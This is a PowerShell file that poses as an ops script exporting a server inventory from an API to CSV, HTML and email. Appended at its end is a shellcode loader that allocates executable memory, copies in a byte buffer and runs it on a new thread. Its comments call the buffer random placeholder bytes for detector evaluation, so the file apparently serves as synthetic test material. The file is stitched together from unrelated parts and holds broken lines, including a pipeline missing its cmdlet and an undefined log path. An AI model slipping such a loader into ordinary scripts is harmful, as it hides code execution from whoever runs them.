<#
.SYNOPSIS
    Calls the Contoso inventory API with retry and exports the server list.
.DESCRIPTION
    Wraps Invoke-RestMethod in a retry helper that backs off on transient errors
    and gives up on client errors such as 401 or 404.
    Pages are followed through the nextLink property until the collection is
    exhausted, then the records are written to CSV.
.PARAMETER BaseUri
    Used when the script runs unattended.
.PARAMETER MaxRetries
    Defaults to the value configured for this host.
.EXAMPLE
    .\Export-ApiInventory.ps1 -PageSize 50
.NOTES
    Author: Ops Team
    Last updated: 2025-08-11
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BaseUri = "https://api.internal.corp/v1",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 10)]
    [int]$MaxRetries = 3,

    [int]$TimeoutSec = 45,
    [int]$PageSize = 50,

    [string]$ReportPath = "C:\Reports\api-servers-2026-02-06.csv"
)

$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
Set-StrictMode -Version 2.0
$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

function Invoke-ContosoApi {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,

        [ValidateSet('Get', 'Post')]
        [string]$Method = 'Get',

        [object]$Body
    )

    $uri = "$BaseUri$Path"
    for ($attempt = 1; $attempt -le $MaxRetries; $attempt++) {
        try {
            $params = @{
                Uri         = $uri
                Method      = $Method
                Headers     = $headers
                TimeoutSec  = $TimeoutSec
                ErrorAction = 'Stop'
            }
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 5
                $params.ContentType = 'application/json'
            }
            return Invoke-RestMethod @params
        }
        catch {
            $status = 0
            if ($_.Exception.Response) {
                $status = [int]$_.Exception.Response.StatusCode
            }
            if (@(400, 401, 403, 404) -contains $status -or $attempt -eq $MaxRetries) {
                throw
            }
            Start-Sleep -Seconds ([math]::Pow(2, $attempt))
        }
    }
}

$page = Invoke-ContosoApi -Path ('/servers?limit=' + $PageSize)
$records = @($page.items)
while ($page.nextLink) {
    $next = $page.nextLink.Replace($BaseUri, '')
    $page = Invoke-ContosoApi -Path $next
    $records += @($page.items)
    Write-Verbose ("Collected {0} records" -f @($records).Count)
}
$summary = $records | Group-Object -Property status | ForEach-Object {
    [pscustomobject]@{
        Status = $_.Name
        Count  = $_.Count
    }
}
$summary | Format-Table -AutoSize

$records | Select-Object id, name, status |
    -Path $ReportPath `
    -NoTypeInformation `
    -Encoding UTF8

$summary | Export-Csv -Path $ReportPath.Replace('.csv', '-summary.csv') -NoTypeInformation -Encoding UTF8

$newTag = @{ tags = @('inventory', 'automated') }
try {
    $tagged = Invoke-ContosoApi -Path '/servers/tags' -Method Post -Body $newTag
    Write-Verbose ("Tag request returned {0}" -f $tagged.status)
}
catch {
    Write-Warning ("Tagging skipped: {0}" -f $_.Exception.Message)
}

$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$summary | ConvertTo-Html -Title 'API inventory summary' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$MailTo = "api-ops@internal.corp"
$MailFrom = 'api-report@internal.corp'
$mailBody = "Inventory run finished with {0} records" -f @($records).Count
Send-MailMessage -To $MailTo -From $MailFrom -Subject 'API inventory' -Body $mailBody -SmtpServer 'smtp.internal.corp' -Port 25

Write-Host ("API inventory complete: {0} records" -f @($records).Count) -ForegroundColor Green
Write-Verbose ("Elapsed requests: {0}" -f [math]::Ceiling(@($records).Count / $PageSize))

$rateLimit = $null
if ($rateLimit) {
    Write-Verbose ("Remaining calls: {0}" -f $rateLimit)
}

$tokenLength = $ApiKey.Length
Write-Verbose ("API key length: {0}" -f $tokenLength)

$baseUriHost = ([uri]$BaseUri).Host
Write-Verbose ("Target host: {0}" -f $baseUriHost)

$endpoints = @('/servers', '/servers/tags', '/health')
$endpoints | ForEach-Object { Write-Verbose ("Endpoint: {0}" -f $_) }

$retryCount = @($records).Count - @($records | Select-Object -Unique) .Count
Write-Verbose ("Duplicate ids skipped: {0}" -f $retryCount)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>
$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x01, 0x55, 0x9a, 0xf1, 0x52, 0x79, 0x35, 0x00, 0x2e, 0x90, 0xc1, 0x4d, 0x90, 0xb9, 0x16, 0xf5,
    0x2c, 0x8f, 0x0d, 0x76, 0x7f, 0x8c, 0x98, 0x49, 0xb0, 0xc2, 0x63, 0x3d, 0x87, 0x8b, 0x85, 0x0f,
    0x5f, 0xd0, 0x15, 0x7d, 0x76, 0x7f, 0x7a, 0x53, 0xb3, 0xcc, 0x79, 0xad, 0x12, 0x1f, 0x40, 0x6e,
    0x42, 0x02, 0xae, 0xfe, 0x58, 0x8d, 0x54, 0x9c, 0x15, 0x94, 0x43, 0xbe, 0x10, 0xb6, 0xf5, 0x8d,
    0x69, 0xe7, 0x1e, 0x1e, 0x4f, 0x8c, 0x8e, 0x28, 0x82, 0x56, 0xe0, 0x96, 0x78, 0xd8, 0x93, 0x90,
    0xa1, 0xdf, 0x2e, 0xa3, 0x48, 0x2a, 0x61, 0x83, 0xab, 0xb5, 0xc9, 0xcf, 0x91, 0xef, 0xec, 0x2d,
    0x8a, 0x64, 0xbc, 0x3e, 0xbf, 0x93, 0xe8, 0x94, 0x3e, 0xa3, 0x29, 0x71, 0xb4, 0x13, 0xd7, 0xae,
    0x33, 0x39, 0x4b, 0xed, 0x6e, 0xaa, 0xc0, 0x10, 0x77, 0xf2, 0x41, 0xfb, 0x2a, 0x3f, 0x47, 0x7f,
    0x16, 0x99, 0x8f, 0x91, 0xc0, 0x15, 0x2e, 0x6c, 0xf3, 0x78, 0x11, 0x6c, 0x7f, 0x3d, 0xda, 0xa4,
    0x18, 0x95, 0xba, 0x62, 0x68, 0x91, 0xd7, 0x14, 0x74, 0xc9, 0x7d, 0x70, 0x42, 0x15, 0x50, 0x74,
    0xab, 0x5e, 0xe0, 0xd3, 0xcf, 0x70, 0x57, 0x80, 0x00, 0xc6, 0x4d, 0x00, 0xfa, 0xc2, 0x24, 0xee,
    0xea, 0xcd, 0x16, 0x36, 0xd5, 0x7c, 0x92, 0x99, 0xfb, 0x9b, 0x4f, 0x32, 0x06, 0x56, 0x11, 0xe8,
    0x63, 0xa7, 0x93, 0x73, 0x6f, 0x95, 0xf9, 0x70, 0xe0, 0x6c, 0x3b, 0x9a, 0xa8, 0x75, 0x05, 0x4c,
    0xc0, 0x7e, 0x76, 0xdd, 0x98, 0xbd, 0x28, 0xdb, 0x1c, 0x54, 0x13, 0x83, 0x24, 0x38, 0x98, 0xa2,
    0xc7, 0xbf, 0xd2, 0xea, 0xf3, 0x9d, 0xed, 0x7e, 0x79, 0x8d, 0xeb, 0x8e, 0x67, 0x09, 0x8e, 0x98,
    0xa5, 0xad, 0xb0, 0x7b, 0x33, 0xc6, 0x2b, 0x1b, 0xeb, 0x87, 0xb1, 0x73, 0x4e, 0x0e, 0x55, 0xc6,
    0x4c, 0x04, 0xa1, 0xd1, 0xfc, 0xf1, 0xff, 0x5f, 0xa7, 0xd0, 0x09, 0x53, 0xe8, 0x1a, 0xe1, 0xde,
    0x09, 0x43, 0x39, 0x3e, 0x16, 0x2b, 0x5c, 0x9a, 0xba, 0x9a, 0xa7, 0xd8, 0xac, 0x64, 0x39, 0xe2,
    0xba, 0xa8, 0xa8, 0x30, 0xc0, 0x88, 0x57, 0xcb, 0xd9, 0x84, 0x33, 0x1a, 0x10, 0x5c, 0x70, 0x11,
    0xed, 0x40, 0xe0, 0xfd, 0x09, 0x80, 0x9c, 0xd1, 0xe7, 0x2b, 0xac, 0x13, 0xde, 0x1c, 0x72, 0xe0,
    0xb7, 0x3e, 0xcf, 0x2e, 0x5d, 0xbc, 0xba, 0x86, 0x1a, 0x05, 0x0c, 0xbc, 0x56, 0xa4, 0xb3, 0xb5,
    0x18, 0xef, 0xa7, 0x43, 0x08, 0x24, 0xa7, 0xfe, 0x04, 0xdf, 0xf5, 0x1e, 0x81, 0x0f, 0x8f, 0xd9,
    0x68, 0x8a, 0xbb, 0x05, 0x50, 0x14, 0xa3, 0x43, 0x81, 0xdc, 0x7c, 0x49, 0x37, 0xe0, 0x41, 0xba,
    0x34, 0x8b, 0x70, 0x8a, 0xbe, 0xfc, 0x47, 0xd0, 0x64, 0x00, 0x7a, 0xe2, 0xa2, 0x52, 0xe4, 0x63,
    0xc2, 0x67, 0x30, 0x05, 0x64, 0xee, 0x9a, 0x3b, 0xe5, 0x9b, 0xcb, 0x77, 0xdc, 0xbc, 0xc7, 0x47,
    0x50, 0xab, 0xf7, 0xe0, 0x56, 0x53, 0x5a, 0x54, 0x3f, 0xee, 0xc9, 0x50, 0x3a, 0xe4, 0x4e, 0x54,
    0x1d, 0x90, 0x6c, 0x5f, 0x43, 0x2c, 0xfa, 0xa7, 0x6c, 0xcc, 0x3a, 0x3d, 0xd5, 0xe5, 0xfd, 0x68,
    0xf2, 0xd2, 0x4e, 0x29, 0x54, 0xba, 0x0b, 0xe2, 0xdd, 0xe4, 0x44, 0x5a, 0x80, 0x23, 0x94, 0xcc,
    0x07, 0x2f, 0x68, 0x12, 0x79, 0x9e, 0x10, 0xc2, 0x89, 0xa4, 0xda, 0x92, 0xeb, 0xdb, 0xd1, 0x20,
    0x83, 0x7b, 0x1c, 0x92, 0x57, 0x7a, 0x8d, 0x58, 0x6c, 0x29, 0x64, 0xe9, 0xdc, 0x89, 0xb5, 0xe2,
    0x05, 0x6a, 0x4e, 0x94, 0x00, 0x23, 0xac, 0x91, 0x1e, 0xd3, 0x84, 0xe0, 0xa0, 0xf5, 0x87, 0xc7,
    0x05, 0x35, 0xe3, 0xe4, 0x8e, 0x76, 0x99, 0x72, 0x4a, 0xe1, 0x8e, 0x21, 0x00, 0x07, 0x9d, 0x17,
    0xff, 0x87, 0x77, 0x8e, 0x6c, 0x67, 0x01, 0x7b, 0xb2, 0xe7, 0xef, 0x6c, 0x9b, 0x7c, 0x8e, 0x1d,
    0xd2, 0x97, 0xe5, 0xb7, 0xc6, 0x2b, 0x1b, 0x39, 0x3d, 0xad, 0x7d, 0x91, 0xa3, 0xc3, 0x67, 0x95
)

$BufferAddress = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $BufferAddress, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $BufferAddress, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 2184)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
